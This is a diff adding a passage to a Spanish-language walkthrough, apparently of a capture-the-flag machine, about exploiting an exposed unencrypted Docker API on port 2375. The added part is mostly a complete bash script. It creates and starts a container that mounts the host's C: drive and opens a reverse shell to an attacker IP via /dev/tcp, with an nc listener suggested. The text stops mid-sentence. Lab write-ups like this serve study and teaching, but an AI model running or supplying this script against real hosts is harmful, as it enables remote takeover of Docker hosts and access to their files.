@@ -101,4 +101,63 @@ EOF
 le daremos permisos de ejecución y lo ejecutamos, y nos enumera los puertos abiertos en esta maquina host
 
 Este nos muestra abierto un puerto muy relevante que es el `2375` que es para las comunicaciones con el demonio de docker en la maquina que los alberga, en este caso son comunicaciones no encriptadas.
-Para explotarlo 
+Para explotarlo usaremos el siguiente script en bash.
+```bash
+#!/bin/bash
+
+# Configuración
+DOCKER_HOST="<IP_Host>:2375"
+ATTACKER_IP="10.10.16.147"
+ATTACKER_PORT="60002"
+IMAGE_NAME="docker_setup-nginx-php:latest"
+
+echo "[*] Enumerando imágenes disponibles..."
+curl -s "http://$DOCKER_HOST/images/json" | python3 -m json.tool
+
+echo -e "\n[*] Creando contenedor malicioso..."
+
+# Crear el payload JSON
+cat > /tmp/create_container.json << EOF
+{
+  "Image": "$IMAGE_NAME",
+  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/host_root"]
+  }
+}
+EOF
+
+echo "[*] Payload creado en /tmp/create_container.json"
+cat /tmp/create_container.json
+
+# Crear el contenedor
+echo -e "\n[*] Enviando solicitud de creación..."
+curl -s -H 'Content-Type: application/json' \
+     -d @/tmp/create_container.json \
+     "http://$DOCKER_HOST/containers/create" \
+     -o /tmp/response.json
+
+echo "[*] Respuesta recibida:"
+cat /tmp/response.json
+
+# Extraer Container ID
+CID=$(grep -o '"Id":"[^"]*"' /tmp/response.json | head -1 | cut -d'"' -f4)
+echo -e "\n[*] Container ID extraído: $CID"
+
+if [ -z "$CID" ]; then
+    echo "[!] Error: No se pudo extraer el Container ID"
+    exit 1
+fi
+
+# Iniciar el contenedor
+echo -e "\n[*] Iniciando contenedor..."
+curl -s -X POST "http://$DOCKER_HOST/containers/$CID/start"
+
+echo -e "\n[*] Verificando estado..."
+curl -s "http://$DOCKER_HOST/containers/$CID/json" | python3 -m json.tool
+
+echo -e "\n[*] ¡Listo! Asegúrate de tener un listener en $ATTACKER_IP:$ATTACKER_PORT"
+echo "    Ejemplo: nc -lvnp $ATTACKER_PORT"
+```
+
+Una vez explotado lo 
